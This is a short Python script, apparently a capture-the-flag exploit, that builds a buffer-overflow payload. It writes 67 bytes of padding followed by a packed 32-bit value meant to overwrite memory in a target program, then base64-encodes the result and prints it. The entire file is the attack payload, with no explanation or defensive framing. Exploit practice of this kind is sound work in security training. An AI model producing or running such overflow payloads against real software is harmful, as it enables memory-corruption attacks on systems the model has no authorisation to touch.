
import sys
import struct
import base64

buf = b'VVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVVV'
buf += struct.pack('<I', 1751558370)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
